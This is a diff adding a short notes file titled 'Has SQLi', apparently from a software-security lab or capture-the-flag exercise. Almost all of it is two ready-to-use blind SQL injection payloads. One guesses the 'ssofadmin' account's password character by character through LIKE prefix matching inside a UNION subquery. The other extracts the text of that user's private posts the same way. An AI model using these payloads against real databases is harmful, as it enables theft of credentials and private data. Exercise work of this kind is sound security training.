@@ -1,0 +1,30 @@
+Has SQLi
+
+
+1', (
+SELECT "Public" FROM Users
+WHERE (
+    username = 'ssofadmin'
+AND password LIKE '<tentativa>%'
+)
+UNION
+SELECT "Private" FROM Users
+WHERE NOT (
+    username = 'ssofadmin'
+AND password LIKE '<tentativa>%'
+)
+LIMIT 1
+))#
+
+1', (
+SELECT "Public" FROM Posts
+WHERE author = 'ssofadmin'
+AND Type='Private'
+AND content LIKE '<...>%'
+UNION
+SELECT "Private" FROM Posts
+WHERE NOT (author = 'ssofadmin'
+AND Type='Private'
+AND content LIKE '<...>%')
+LIMIT 1
+))#
